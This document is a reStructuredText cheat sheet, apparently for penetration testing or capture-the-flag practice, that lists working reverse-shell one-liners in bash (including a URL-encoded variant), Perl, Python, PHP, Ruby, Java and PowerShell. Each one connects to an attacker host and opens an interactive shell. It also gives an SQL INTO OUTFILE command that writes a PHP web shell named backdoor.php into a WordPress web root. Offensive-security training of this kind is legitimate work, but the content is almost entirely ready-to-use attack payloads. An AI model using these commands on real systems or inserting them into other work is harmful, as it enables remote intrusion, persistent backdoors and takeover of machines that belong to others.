Creating reverse shells
*************************

bash
######

.. code-block:: console

   normal: bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
   bash within bash: bash -c ' bash+-i+>&+/dev/tcp/10.10.14.20/4444+0>&1 '
   bash within bash url: bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.20/4444+0>%261'

perl
######

.. code-block:: console

   perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'

python
########

.. code-block:: console

   python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

PHP
#####

.. code-block:: console

        php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

SQL + PHP
############

.. code-block:: console

   SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/wordpress/backdoor.php"

Ruby
######

.. code-block:: console

   ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

Java
########

.. code-block:: console

   r = Runtime.getRuntime()
   p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
   p.waitFor()

Powershell
#############

.. code-block:: console

   powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_IP>',<attacker listener port>);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
